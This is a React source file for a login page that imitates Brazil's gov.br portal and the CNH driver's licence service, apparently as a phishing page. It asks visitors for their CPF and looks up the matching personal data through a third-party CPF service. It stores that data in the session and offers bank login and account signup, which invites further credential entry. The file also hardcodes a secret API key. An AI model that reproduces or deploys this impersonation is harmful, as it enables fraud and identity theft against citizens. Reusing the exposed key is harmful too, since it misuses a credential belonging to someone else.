import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Banknote, Moon, Accessibility, UserSquare, Mail, Lock, User as UserIcon } from 'lucide-react';
import { supabase } from '../integrations/supabase/client';

const LoginHeader: React.FC = () => (
  <header className="bg-white border-b border-gray-200">
    <div className="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
      <img 
        src="/Gov.br_logo.svg.png" 
        alt="gov.br" 
        className="h-8"
      />
      <div className="flex items-center gap-4 text-blue-700">
        <button className="p-1 hover:bg-gray-100 rounded-full"><Moon size={20} /></button>
        <button className="p-1 hover:bg-gray-100 rounded-full"><Accessibility size={20} /></button>
      </div>
    </div>
  </header>
);

const CnhLogo: React.FC = () => (
    <div className="flex items-center justify-center mb-6">
        <div className="inline-block">
            <div className="flex items-end">
                <span className="text-6xl font-extrabold text-[#0033a0]">CNH</span>
                <div className="w-0 h-0
                    border-b-[40px] border-b-transparent
                    border-l-[40px] border-l-yellow-400
                    border-t-[40px] border-t-transparent
                    -ml-2">
                </div>
            </div>
            <div className="bg-[#009739] text-white font-bold text-center text-lg -mt-5 py-0.5 tracking-wider">
                DO BRASIL
            </div>
        </div>
    </div>
);

const LoginPage: React.FC = () => {
  const [cpf, setCpf] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false); // Novo estado para alternar entre login e cadastro
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const formattedCpf = value
      .replace(/\D/g, '')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    
    setCpf(formattedCpf.substring(0, 14));
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!email || !password) {
      setError("Por favor, preencha todos os campos.");
      return;
    }
    setIsLoading(true);

    const { error: signInError } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (signInError) {
      console.error("Erro de login:", signInError);
      setError(signInError.message || "Erro ao fazer login. Verifique suas credenciais.");
    } else {
      navigate('/confirmation'); // Redirecionar para a página de confirmação após o login
    }
    setIsLoading(false);
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!name || !email || !password) {
      setError("Por favor, preencha todos os campos.");
      return;
    }
    setIsLoading(true);

    const { data, error: signUpError } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          name: name,
        },
      },
    });

    if (signUpError) {
      console.error("Erro de cadastro:", signUpError);
      setError(signUpError.message || "Erro ao cadastrar. Tente novamente.");
    } else if (data.user) {
      alert("Cadastro realizado com sucesso! Por favor, verifique seu e-mail para confirmar sua conta.");
      setIsRegistering(false); // Volta para a tela de login após o cadastro
      setEmail('');
      setPassword('');
      setName('');
    }
    setIsLoading(false);
  };

  const handleCpfValidation = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!cpf) {
      setError("Por favor, digite um CPF.");
      return;
    }
    setIsLoading(true);

    const apiKey = 'b77f7a8b39207b2199969684bdad61d2f93113323a6c4d796e9bd8e256c55df6';
    const url = `https://api.cpfhub.io/cpf/${cpf.replace(/\D/g, '')}`;

    try {
      const response = await fetch(url, {
        headers: {
          'x-api-key': apiKey
        }
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // Armazenar dados do usuário na sessão para uso posterior
        sessionStorage.setItem('cnh_userData', JSON.stringify({ ...data.data, cpf: cpf }));
        navigate('/confirmation');
      } else {
        setError(`Erro ao consultar o CPF: ${data.message || 'CPF inválido ou não encontrado.'}`);
      }
    } catch (error) {
      console.error("Erro na requisição:", error);
      setError("Ocorreu um erro ao tentar validar o CPF. Tente novamente mais tarde.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-gray-50 min-h-screen">
      <LoginHeader />
      <main className="max-w-sm mx-auto px-4 py-8">
        <div className="bg-white p-6 rounded-lg shadow">
          <CnhLogo />
          <h1 className="text-xl font-bold text-gray-800 mb-4 text-center">
            {isRegistering ? 'Crie sua conta gov.br' : 'Identifique-se no gov.br'}
          </h1>
          
          {error && (
            <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-3 rounded-md mb-4">
              <p className="text-sm">{error}</p>
            </div>
          )}

          {isRegistering ? (
            <form onSubmit={handleRegister}>
              <div className="mb-4">
                <label htmlFor="name" className="block text-sm font-bold text-gray-700 mb-1">Nome Completo</label>
                <div className="relative">
                  <UserIcon className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                  <input 
                    type="text" 
                    id="name"
                    placeholder="Seu nome completo"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                    disabled={isLoading}
                    required
                  />
                </div>
              </div>
              <div className="mb-4">
                <label htmlFor="email" className="block text-sm font-bold text-gray-700 mb-1">Email</label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                  <input 
                    type="email" 
                    id="email"
                    placeholder="seuemail@exemplo.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                    disabled={isLoading}
                    required
                  />
                </div>
              </div>
              <div className="mb-6">
                <label htmlFor="password" className="block text-sm font-bold text-gray-700 mb-1">Senha</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                  <input 
                    type="password" 
                    id="password"
                    placeholder="Sua senha"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                    disabled={isLoading}
                    required
                  />
                </div>
              </div>
              <button 
                type="submit"
                className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
                disabled={isLoading}
              >
                {isLoading ? 'Cadastrando...' : 'Cadastrar'}
              </button>
              <p className="text-center text-sm text-gray-600 mt-4">
                Já tem uma conta?{' '}
                <button 
                  type="button" 
                  onClick={() => setIsRegistering(false)} 
                  className="text-[#0d6efd] hover:underline font-semibold"
                >
                  Fazer Login
                </button>
              </p>
            </form>
          ) : (
            <>
              <div className="flex items-start gap-3 mb-6">
                <UserSquare size={24} className="text-blue-600 mt-1 shrink-0" />
                <div>
                  <p className="font-semibold text-gray-700">Número do CPF</p>
                  <p className="text-sm text-gray-600">
                    Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
                  </p>
                </div>
              </div>
              
              <form onSubmit={handleCpfValidation}>
                <div className="mb-4">
                  <label htmlFor="cpf" className="block text-sm font-bold text-gray-700 mb-1">CPF</label>
                  <input 
                    type="text" 
                    id="cpf"
                    placeholder="000.000.000-00"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="w-full p-3 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg tracking-wider"
                    disabled={isLoading}
                    maxLength={14}
                  />
                </div>
                <button 
                  type="submit"
                  className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
                  disabled={isLoading}
                >
                  {isLoading ? 'Verificando...' : 'Continuar'}
                </button>
              </form>

              <div className="mt-8">
                <div className="relative my-6">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-gray-300"></div>
                  </div>
                  <div className="relative flex justify-center text-sm">
                    <span className="px-2 bg-white text-gray-500">Outras opções de identificação:</span>
                  </div>
                </div>
                <button className="w-full flex items-center justify-between p-3 border border-gray-300 rounded-lg hover:bg-gray-50">
                  <div className="flex items-center gap-3">
                    <Banknote size={20} className="text-green-600" />
                    <span className="font-semibold text-green-700">Login com seu banco</span>
                  </div>
                  <span className="bg-green-600 text-white text-xs font-bold px-2 py-1 rounded">SUA CONTA SERÁ PRATA</span>
                </button>
                <p className="text-center text-sm text-gray-600 mt-4">
                  Não tem conta gov.br?{' '}
                  <button 
                    type="button" 
                    onClick={() => setIsRegistering(true)} 
                    className="text-[#0d6efd] hover:underline font-semibold"
                  >
                    Crie sua conta
                  </button>
                </p>
              </div>
            </>
          )}
        </div>
      </main>
    </div>
  );
};

export default LoginPage;